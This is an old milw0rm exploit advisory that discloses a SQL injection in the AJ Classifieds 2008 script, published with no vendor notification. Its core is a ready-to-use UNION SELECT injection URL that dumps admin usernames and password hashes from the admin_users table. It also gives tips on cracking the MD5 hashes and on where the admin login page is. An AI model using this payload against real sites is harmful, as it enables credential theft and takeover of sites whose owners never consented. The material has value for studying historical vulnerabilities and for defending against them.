@@ -1,0 +1,52 @@
+--==+================================================================================+==--
+--==+       AJ Classifieds 2008 (index.php) Remote SQL Injection Vulnerability	     +==--
+--==+================================================================================+==--
+
+
+
+Discovered By: t0pP8uZz
+Discovered On: 12 MAY 2008
+Script Download: http://www.ajsquare.com/products/classifieds/index.php?auc=1
+DORK: N/A
+
+
+
+Vendor Has Not Been Notified!
+
+
+
+DESCRIPTION: 
+
+AJ Classifieds 2008 (and possibly prior verisons) suffers from a insecure mysql query, This allows the
+remote attacker to arbitrary execute mysql code/querys.
+
+the below injection will perform a SELECT query which will display admin credentials in RED text.
+
+
+
+SQL Injection:
+
+http://site.com/index.php?do=details_posting&cat_id=5&posting_id=-1'/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,CONCAT(0x3C666F6E7420636F6C6F723D22726564223E,user_name,char(58),password,0x3C2F666F6E743E),15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44/**/FROM/**/admin_users/**/LIMIT/**/0,1/*
+
+
+
+NOTE/TIP: 
+
+passwords are in md5 (MD5 Algorithms)
+admin login is at "/admin/adminlogin.php"
+
+"magic_quotes_gpc" must be on
+
+
+
+GREETZ: milw0rm.com, h4ck-y0u.org, CipherCrew !
+
+
+peace, t0pP8uZz
+
+
+--==+================================================================================+==--
+--==+       AJ Classifieds 2008 (index.php) Remote SQL Injection Vulnerability	     +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2008-05-12]
